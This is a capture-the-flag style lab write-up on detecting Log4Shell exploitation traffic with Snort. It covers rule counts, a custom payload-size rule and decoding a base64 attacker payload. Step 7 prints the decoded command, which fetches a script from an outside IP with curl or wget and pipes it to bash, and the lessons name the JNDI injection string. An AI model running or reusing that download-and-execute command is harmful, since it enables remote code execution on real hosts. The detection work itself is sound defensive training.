# 🧪 Task 8 – Detecting Log4j Exploitation with Snort

This task focused on detecting Log4Shell (CVE-2021-44228), a critical vulnerability in Apache Log4j that allowed remote code execution via crafted input strings. It’s one of the most impactful vulnerabilities in recent history — and this lab showed how to detect its exploitation in raw traffic.

---

## 📁 PCAP File Used

`log4j.pcap`

---

## 🔧 Objective

- Use external rules to detect Log4j exploitation attempts
- Extract SID activity, packet sizes, encoding types, and payloads
- Write custom rules based on payload size
- Decode a base64-encoded attacker command

---

## 📜 Step 1 – Run Detection with Provided Rule File

```bash
sudo snort -c local.rules -r log4j.pcap -l .
```

✅ **Answer:** 26 packets detected

---

## 📊 Step 2 – Count Unique Triggered Rules

```bash
grep "\[\*\*\]" alert | awk -F ':' '{print $2}' | sort -u | wc -l
```

✅ **Answer:** 4 rules triggered

---

## 🔍 Step 3 – Extract Rule SID Prefix

```bash
grep "\[\*\*\]" alert | awk -F ':' '{print $2}' | cut -c1-6 | sort -u
```

✅ **Answer:** `210037`

---

## 📜 Step 4 – Write Rule Based on Payload Size

```snort
alert tcp any any -> any any (msg: "Packet payload size between 770 and 855 bytes detected"; dsize:770<>855; sid:1000001;)
```

**Command:**

```bash
sudo snort -c local-1.rules -A full -l . -r log4j.pcap
```

✅ **Answer:** 41 packets detected

---

## 🔍 Step 5 – Identify Encoding Algorithm

```bash
sudo strings snort.log.* | grep -i "base64"
```

✅ **Answer:** `Base64`

---

## 🧾 Step 6 – Extract IP ID

```bash
sudo strings alert | grep -i "ID"
```

✅ **Answer:** `62808`

---

## 🧠 Step 7 – Decode the Payload

Encoded payload found in log:

```
KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=
```

Decoded using `echo [string] | base64 -d`:

✅ **Decoded Command:**

```bash
(curl -s 45.155.205.233:5874/162.0.228.253:80 || wget -q -O- 45.155.205.233:5874/162.0.228.253:80) | bash
```

---

## 🧮 Step 8 – CVSS Score

**Log4j CVSS v2 Score:** `9.3`  
This reflects full remote code execution with no authentication — the highest level of criticality.

---

## 🧠 Lessons Learned

- Log4Shell often involves injecting `${jndi:ldap://...}` strings that trigger lookups and payload downloads.
- Base64 encoding is commonly used to hide attacker commands in payloads.
- Using `dsize` is a clever detection method when strings are obfuscated but payload sizes remain consistent.
- Combining alert logs with `strings`, `grep`, and `base64 -d` gives you full visibility into what attackers are doing.

---

## 🛡️ Real-World Relevance

This is the kind of attack SOC teams had to scramble to detect in late 2021. Knowing how to:

- Write detections for obfuscated strings
- Recognize payload encoding
- Decode and analyze the actual command

…makes you a more valuable analyst or detection engineer.

---

## ✅ Summary

In this final task, I:

- Detected Log4j exploit traffic using Snort
- Counted and analyzed triggered rules
- Wrote custom size-based detection
- Decoded an attacker command in base64
- Researched the vulnerability's severity

This task tied together everything from payload analysis to signature tuning — a solid end to the lab.

